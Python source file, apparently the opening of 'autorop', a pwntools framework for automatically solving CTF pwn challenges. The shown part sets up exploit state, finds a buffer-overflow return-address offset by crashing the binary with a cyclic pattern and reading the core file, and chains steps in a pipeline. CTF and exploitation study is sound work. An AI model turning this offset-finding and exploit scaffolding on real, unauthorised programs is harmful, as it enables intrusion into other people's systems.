#!/usr/bin/env python3
# autorop - automated solver of classic CTF pwn challenges, with flexibility in mind

from pwn import *

# make mypy happy by explicitly importing what we use
from pwn import tube, ELF, context, cyclic, cyclic_find, pack, log, process
from dataclasses import dataclass
from typing import Callable, Optional
from functools import reduce


class PwnState:
    """Class for keeping track of our exploit development."""

    def __init__(self, binary_name: str, target: tube, vuln_function: str = "main"):
        self.binary_name = binary_name  # path to binary
        self.target = target  # tube pointing to the victim to exploit
        self.vuln_function = vuln_function  # name of vulnerable function in binary,
        # to return to repeatedly
        self.elf: ELF = ELF(self.binary_name)  # pwntools ELF of binary_name
        self.libc: Optional[ELF] = None  # ELF of target's libc
        # offset to return address via buffer overflow
        self.bof_ret_offset: Optional[int] = None

        # set pwntools' context appropriately
        context.binary = self.binary_name  # set architecture etc. automagically
        context.cyclic_size = context.bits / 8


def bof_corefile(state: PwnState) -> PwnState:
    """Find the offset to the return address via buffer overflow."""
    CYCLIC_SIZE = 1024
    if state.bof_ret_offset is None:
        # cause crash and find offset via corefile
        p: tube = process(state.binary_name)
        p.sendline(cyclic(CYCLIC_SIZE))
        p.wait()
        fault: int = p.corefile.fault_addr
        log.info("Fault address @ " + hex(fault))
        state.bof_ret_offset = cyclic_find(pack(fault))
    log.info("Offset to return address is " + str(state.bof_ret_offset))
    return state


def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnState:
    """Pass the PwnState through a "pipeline", sequentially executing each given function."""

    with log.progress("Pipeline") as progress:

        def reducer(state: PwnState, func: Callable[[PwnState], PwnState]) -> PwnState:
            log.debug(state)
            progress.status(func.__name__)
            return func(state)

        return reduce(reducer, funcs, state)
